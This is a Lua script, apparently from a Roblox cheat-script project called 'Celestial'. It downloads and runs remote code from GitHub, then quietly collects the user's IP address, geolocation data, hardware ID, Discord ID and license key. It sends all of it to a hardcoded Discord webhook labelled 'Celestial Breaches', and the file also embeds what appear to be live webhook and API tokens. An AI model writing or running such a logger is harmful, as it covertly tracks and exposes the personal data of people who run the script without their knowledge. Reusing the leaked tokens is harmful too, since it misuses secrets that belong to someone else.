local webhookUrl = "https://discord.com/api/webhooks/1518753784103440475/58yP4IJhZVAMhlc_T__SADZIMFi54H9m40z7GXlVKteJMvW5Gz7GM_fh-2woTrXGJc1w"
local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()
local embedLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Embed%20Library.lua"))()

getgenv()._celestial_noauth = true
local auth = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Authentication.lua"))()

local isUser = auth.isUser()
local user = auth.getUser()

local player = game:GetService("Players").LocalPlayer
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local httpService = game:GetService("HttpService")
local hashedHWID = utils.hash(hwid, "SHA-384")
local userInputService = game:GetService("UserInputService")

local ipv4 = game:HttpGet("https://api.ipify.org")
local ipdetails = game:HttpGet("https://ipinfo.io/?token=03dce9579aa8e0")

local function getDevice()
    if userInputService.TouchEnabled then
        return "Mobile"
    elseif userInputService.KeyboardEnabled then
        return "PC"
    elseif userInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

-- Embed

local footerText
if not isUser then
    footerText = "⚠️ User is not authorized."
end

local embedData = {
    webhookUrl = webhookUrl,
    title = nil,
    description = false,
    color = Color3.fromRGB(255, 0, 0),
    url = "https://roblox.com/users/" .. player.UserId .. "/profile",
    thumbnail = nil,
    author = {
        name = "Potential Celestial Breach",
        icon_url = "https://i.imgur.com/eP1Ldg9.png",
        url = nil
    },
    footer = {
        enabled = true,
        name = footerText,
        icon = nil,
        displaySeconds = true
    },
}

local embed = embedLib.createEmbed(embedData)

-- Fields

local discordId = tostring(isUser and user.DiscordId or 0)
local identifier = tostring(isUser and user.Identifier or "Unknown")
local rank = tostring(isUser and user.Rank or "Unknown")
local key = tostring(isUser and user.Key or "Unknown")

local fields = {
    { name = "Identifier", value = identifier, inline = true },
    { name = "Rank", value = rank, inline = true },
    { name = "Key", value = "||```" .. key .. "```||", inline = true },
    { name = "Linked Account", value = "<@" .. discordId .. ">", inline = true },
    { name = "Account Age", value = player.AccountAge .. " Days", inline = true },
    { name = "Device", value = getDevice(), inline = true },
    { name = "Exploit", value = identifyexecutor(), inline = true },
    { name = "IPv4", value = "||```" .. ipv4 .. "```||", inline = true },
    { name = "Hardware ID (HWID)", value = "||```" .. hashedHWID .. "``` ```\n\n" .. hwid .. "```||", inline = true },
    { name = "IP Address Lookup", value = "[IPLocation.io](https://iplocation.io/ip/" .. ipv4 .. ")", inline = true },
    { name = "IP Address Geolocation Data", value = "||```json" .. "\n" .. ipdetails .. "```||", inline = false },
}

for _, field in ipairs(fields) do
    embedLib.addField(embed, field.name, field.value, field.inline)
end

embedLib.sendEmbed(embed, "Celestial Breaches", "Celestial")